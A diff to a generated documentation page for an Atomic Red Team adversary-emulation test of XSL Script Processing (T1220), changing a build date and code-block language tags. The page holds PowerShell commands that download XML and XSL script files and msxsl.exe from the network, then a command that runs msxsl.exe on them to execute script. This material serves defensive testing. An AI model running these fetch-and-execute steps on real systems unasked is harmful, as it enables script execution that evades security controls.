@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1220"
 attack_technique_name: "XSL Script Processing"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1220/T1220.yaml"
-build_date: "2026-04-26 14:38:40"
+build_date: "2026-04-26 17:02:12"
 executor: "command_prompt"
 aliases:
   - "ca23bfb2-023f-49c5-8802-e66997de462d"
@@ -66,13 +66,13 @@ XML file must exist on disk at specified location (#{xmlfile})
 
 ### Prerequisite Check
 
-```text
+```powershell
 if (Test-Path "#{xmlfile}") {exit 0} else {exit 1}
 ```
 
 ### Get Prerequisite
 
-```text
+```powershell
 New-Item -Type Directory (split-path "#{xmlfile}") -ErrorAction Ignore | Out-Null
 Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/msxslxmlfile.xml" -OutFile "#{xmlfile}"
 ```
@@ -81,13 +81,13 @@ XSL file must exist on disk at specified location (#{xslfile})
 
 ### Prerequisite Check
 
-```text
+```powershell
 if (Test-Path "#{xslfile}") {exit 0} else {exit 1}
 ```
 
 ### Get Prerequisite
 
-```text
+```powershell
 New-Item -Type Directory (split-path "#{xslfile}") -ErrorAction Ignore | Out-Null
 Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/msxslscript.xsl" -OutFile "#{xslfile}"
 ```
@@ -96,13 +96,13 @@ msxsl.exe must exist on disk at specified location (#{msxsl_exe})
 
 ### Prerequisite Check
 
-```text
+```powershell
 if (Test-Path "#{msxsl_exe}") {exit 0} else {exit 1}
 ```
 
 ### Get Prerequisite
 
-```text
+```powershell
 New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
 Invoke-WebRequest "https://web.archive.org/web/20200803205229if_/https://download.microsoft.com/download/f/2/6/f263ac46-1fe9-4ae9-8fd3-21102100ebf5/msxsl.exe" -OutFile "#{msxsl_exe}"
 ```
@@ -113,13 +113,13 @@ Invoke-WebRequest "https://web.archive.org/web/20200803205229if_/https://downloa
 
 ### Command
 
-```commandprompt
+```cmd
 "#{msxsl_exe}" "#{xmlfile}" "#{xslfile}"
 ```
 
 ### Cleanup
 
-```commandprompt
+```cmd
 del "#{msxsl_exe}" >nul 2>&1
 ```
 
